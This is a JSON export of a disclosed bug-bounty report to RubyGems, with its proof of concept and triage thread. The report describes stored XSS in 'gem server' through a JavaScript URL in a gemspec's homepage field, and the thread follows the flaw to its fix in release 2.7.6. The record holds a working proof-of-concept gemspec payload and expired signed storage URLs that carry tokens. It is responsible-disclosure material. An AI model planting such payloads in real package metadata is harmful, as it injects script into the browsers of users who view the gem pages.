{"id":289313,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODkzMTM=","url":"https://hackerone.com/reports/289313","title":"[gem server] Stored XSS via crafted JavaScript URL inclusion in Gemspec","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-11-10T23:06:18.960Z","submitted_at":"2017-11-10T23:06:18.960Z","is_member_of_team?":false,"reporter":{"disabled":true,"username":"ysx","url":"/ysx","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8212,"url":"https://hackerone.com/rubygems","handle":"rubygems","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"RubyGems","twitter_handle":"rubygems_status","website":"https://rubygems.org","about":"RubyGems.org is the Ruby community’s gem hosting service."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-02-22T06:30:28.542Z","bug_reporter_agreed_on_going_public_at":"2018-02-22T06:30:28.430Z","team_member_agreed_on_going_public_at":"2018-02-22T03:35:37.054Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nA JavaScript URL injection in the `homepage` field within a Gemspec file can be leveraged to achieve stored XSS on the default `gem server` web interface, referenced [here](http://guides.rubygems.org/run-your-own-gem-server/).\n\n\u003e When you install RubyGems, it adds the gem server command to your system. This is the fastest way to start hosting gems.\n\nAs such, a carefully crafted Ruby gem can be installed to exploit this vulnerability against the [gem server](https://github.com/rubygems/rubygems/blob/master/lib/rubygems/server.rb).\n\n## Prerequisite steps\n\nFirst, please create a new Gemspec file (e.g. \"securitytest.gemspec\") with the following contents:\n\n```\nGem::Specification.new do |s|\n  s.name = 'securitytest'\n  s.version = '0.1.0'\n  s.date = '2017-11-10'\n  s.summary = \"This is a proof-of-concept gem\"\n    s.description = \"Select the WWW hyperlink.\"\n    s.authors = [\"Author Name\"]\n  s.homepage = 'javascript:confirm(document.domain)'\nend\n```\n\nAfter saving this Gemspec file, please execute `gem build securitytest.gemspec` and locate the resultant Gem file ahead of the following steps.\n\n## Steps to reproduce\n\n1. Please install the newly created Gem (\"securitytest-0.1.0.gem\") on your system.\n2. Next, execute `gem server` to launch the built-in hosting interface.\n3. Access the RubyGems Documentation Index via the applicable port.\n4. Finally, locate the `securitytest` gem and select the `[www]` link to execute the JavaScript payload.\n\n### Supporting evidence\n\n{F238563}\n\nPlease let me know if you require any additional information regarding this issue.\n\nThanks\n\nYasin","vulnerability_information_html":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eA JavaScript URL injection in the \u003ccode\u003ehomepage\u003c/code\u003e field within a Gemspec file can be leveraged to achieve stored XSS on the default \u003ccode\u003egem server\u003c/code\u003e web interface, referenced \u003ca href=\"/redirect?url=http%3A%2F%2Fguides.rubygems.org%2Frun-your-own-gem-server%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehere\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eWhen you install RubyGems, it adds the gem server command to your system. This is the fastest way to start hosting gems.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eAs such, a carefully crafted Ruby gem can be installed to exploit this vulnerability against the \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frubygems%2Frubygems%2Fblob%2Fmaster%2Flib%2Frubygems%2Fserver.rb\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003egem server\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"prerequisite-steps\"\u003ePrerequisite steps\u003c/h2\u003e\n\n\u003cp\u003eFirst, please create a new Gemspec file (e.g. \u0026quot;securitytest.gemspec\u0026quot;) with the following contents:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGem::Specification.new do |s|\n  s.name = \u0026#39;securitytest\u0026#39;\n  s.version = \u0026#39;0.1.0\u0026#39;\n  s.date = \u0026#39;2017-11-10\u0026#39;\n  s.summary = \u0026quot;This is a proof-of-concept gem\u0026quot;\n    s.description = \u0026quot;Select the WWW hyperlink.\u0026quot;\n    s.authors = [\u0026quot;Author Name\u0026quot;]\n  s.homepage = \u0026#39;javascript:confirm(document.domain)\u0026#39;\nend\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter saving this Gemspec file, please execute \u003ccode\u003egem build securitytest.gemspec\u003c/code\u003e and locate the resultant Gem file ahead of the following steps.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003ePlease install the newly created Gem (\u0026quot;securitytest-0.1.0.gem\u0026quot;) on your system.\u003c/li\u003e\n\u003cli\u003eNext, execute \u003ccode\u003egem server\u003c/code\u003e to launch the built-in hosting interface.\u003c/li\u003e\n\u003cli\u003eAccess the RubyGems Documentation Index via the applicable port.\u003c/li\u003e\n\u003cli\u003eFinally, locate the \u003ccode\u003esecuritytest\u003c/code\u003e gem and select the \u003ccode\u003e[www]\u003c/code\u003e link to execute the JavaScript payload.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch3 id=\"supporting-evidence\"\u003eSupporting evidence\u003c/h3\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Gem_Server_XSS.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/238/563/ee12dce3f2edf3f1b0cca43d789fa92ace56d893/Gem_Server_XSS.png?response-content-disposition=attachment%3B%20filename%3D%22Gem_Server_XSS.png%22%3B%20filename%2A%3DUTF-8%27%27Gem_Server_XSS.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T052505Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=7e44762c879a7d4e771c87fec5730ba3d03edabbbc632ed8cbc8dc8f5e482cb0\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/238/563/ee12dce3f2edf3f1b0cca43d789fa92ace56d893/Gem_Server_XSS.png?response-content-disposition=attachment%3B%20filename%3D%22Gem_Server_XSS.png%22%3B%20filename%2A%3DUTF-8%27%27Gem_Server_XSS.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T052505Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=7e44762c879a7d4e771c87fec5730ba3d03edabbbc632ed8cbc8dc8f5e482cb0\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003ePlease let me know if you require any additional information regarding this issue.\u003c/p\u003e\n\n\u003cp\u003eThanks\u003c/p\u003e\n\n\u003cp\u003eYasin\u003c/p\u003e\n","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":238563,"file_name":"Gem_Server_XSS.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/238/563/ee12dce3f2edf3f1b0cca43d789fa92ace56d893/Gem_Server_XSS.png?response-content-disposition=attachment%3B%20filename%3D%22Gem_Server_XSS.png%22%3B%20filename%2A%3DUTF-8%27%27Gem_Server_XSS.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052505Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026X-Amz-Signature=7e44762c879a7d4e771c87fec5730ba3d03edabbbc632ed8cbc8dc8f5e482cb0","file_size":57029,"type":"image/png"}],"allow_singular_disclosure_at":"2018-03-24T03:35:37.164Z","allow_singular_disclosure_after":-87356968.29834074,"singular_disclosure_allowed":true,"vote_count":4,"voters":["eveeez","japz","mandark","03813136"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":2043,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/rubygems/rubygems","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2150496,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for submitting this report to RubyGems. Our team will review and investigate the issue. Please note that only issues in the rubygems library are eligible for our bug bounty program.","markdown_message":"\u003cp\u003eThanks for submitting this report to RubyGems. Our team will review and investigate the issue. Please note that only issues in the rubygems library are eligible for our bug bounty program.\u003c/p\u003e\n","automated_response":true,"created_at":"2017-11-10T23:06:22.086Z","updated_at":"2017-11-10T23:06:22.086Z","actor":{"url":"/rubygems","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"RubyGems"}},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2154075,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi again, just wanted to provide a quick update that the [Gem in a Box](https://rubygems.org/gems/geminabox) gem was affected by a similar [vulnerability](https://snyk.io/vuln/SNYK-RUBY-GEMINABOX-20444) which has now been patched. Thanks again!","markdown_message":"\u003cp\u003eHi again, just wanted to provide a quick update that the \u003ca href=\"/redirect?url=https%3A%2F%2Frubygems.org%2Fgems%2Fgeminabox\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eGem in a Box\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e gem was affected by a similar \u003ca href=\"/redirect?url=https%3A%2F%2Fsnyk.io%2Fvuln%2FSNYK-RUBY-GEMINABOX-20444\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003evulnerability\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e which has now been patched. Thanks again!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-13T14:55:11.987Z","updated_at":"2017-11-13T14:55:11.987Z","actor":{"username":"ysx","cleared":false,"url":"/ysx","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2343757,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ysx sorry for our delay getting to this, I'm looking into this now","markdown_message":"\u003cp\u003e\u003ca href=\"/ysx\"\u003e@ysx\u003c/a\u003e sorry for our delay getting to this, I\u0026#39;m looking into this now\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-02T03:30:08.360Z","updated_at":"2018-02-02T03:30:08.360Z","actor":{"username":"claudijd","cleared":false,"url":"/claudijd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2343825,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ysx I've written an initial patch for the fix, I still need to write the tests that validate it, but here's my first pass on it.  Let me know if you have any feedback.","markdown_message":"\u003cp\u003e\u003ca href=\"/ysx\"\u003e@ysx\u003c/a\u003e I\u0026#39;ve written an initial patch for the fix, I still need to write the tests that validate it, but here\u0026#39;s my first pass on it.  Let me know if you have any feedback.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-02T04:16:11.326Z","updated_at":"2018-02-02T04:16:11.326Z","actor":{"username":"claudijd","cleared":false,"url":"/claudijd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":259576,"filename":"0001-Fix-289313.patch","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/259/576/8ca14be5eeaa66b88e6363ecfd60e56027de174d/0001-Fix-289313.patch?response-content-disposition=attachment%3B%20filename%3D%220001-Fix-289313.patch%22%3B%20filename%2A%3DUTF-8%27%270001-Fix-289313.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052505Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026X-Amz-Signature=23ccb662b0164ca808f26673a11704e930fdaf17b19e6b377eb84df151ea7b5f"}],"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2344286,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @claudijd,\n\nNo problem and thanks very much for writing a patch. I've tested this with `gem server` on `ruby 2.4.3p205` and can confirm the JavaScript URI issue has been fixed.\n\nKind regards,\n\nYasin","markdown_message":"\u003cp\u003eHi \u003ca href=\"/claudijd\"\u003e@claudijd\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eNo problem and thanks very much for writing a patch. I\u0026#39;ve tested this with \u003ccode\u003egem server\u003c/code\u003e on \u003ccode\u003eruby 2.4.3p205\u003c/code\u003e and can confirm the JavaScript URI issue has been fixed.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003c/p\u003e\n\n\u003cp\u003eYasin\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-02T08:18:21.153Z","updated_at":"2018-02-02T08:21:14.025Z","actor":{"username":"ysx","cleared":false,"url":"/ysx","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2356394,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ysx I wrote up the unit-tests for these last night.  We're just waiting on code review of the changes and then lining it up with a fixed release window.  Will let you know when I know more.","markdown_message":"\u003cp\u003e\u003ca href=\"/ysx\"\u003e@ysx\u003c/a\u003e I wrote up the unit-tests for these last night.  We\u0026#39;re just waiting on code review of the changes and then lining it up with a fixed release window.  Will let you know when I know more.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-06T18:46:07.180Z","updated_at":"2018-02-06T18:46:24.615Z","actor":{"username":"claudijd","cleared":false,"url":"/claudijd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2364286,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Moving this into triaged state because we have a code fix, tests, reviewed code, and it just needs to be landed while lining up with a rubygems release.","markdown_message":"\u003cp\u003eMoving this into triaged state because we have a code fix, tests, reviewed code, and it just needs to be landed while lining up with a rubygems release.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-08T23:02:40.890Z","updated_at":"2018-02-08T23:02:40.890Z","actor":{"username":"claudijd","cleared":false,"url":"/claudijd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2365558,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great to hear, thanks for the updates @claudijd!","markdown_message":"\u003cp\u003eGreat to hear, thanks for the updates \u003ca href=\"/claudijd\"\u003e@claudijd\u003c/a\u003e!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-09T06:49:58.349Z","updated_at":"2018-02-09T06:49:58.349Z","actor":{"username":"ysx","cleared":false,"url":"/ysx","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2395690,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This was fixed in RubyGems release 2.7.6.  Thanks for your contribution!\n\nhttp://blog.rubygems.org/2018/02/15/2.7.6-released.html","markdown_message":"\u003cp\u003eThis was fixed in RubyGems release 2.7.6.  Thanks for your contribution!\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://blog.rubygems.org/2018/02/15/2.7.6-released.html\" href=\"/redirect?url=http%3A%2F%2Fblog.rubygems.org%2F2018%2F02%2F15%2F2.7.6-released.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://blog.rubygems.org/2018/02/15/2.7.6-released.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-18T04:16:02.992Z","updated_at":"2018-02-18T04:16:02.992Z","actor":{"username":"claudijd","cleared":false,"url":"/claudijd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2395692,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-18T04:16:17.317Z","updated_at":"2018-02-18T04:16:17.317Z","actor":{"username":"claudijd","cleared":false,"url":"/claudijd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ysx","url":"/ysx"},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2395715,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-18T04:38:23.980Z","updated_at":"2018-02-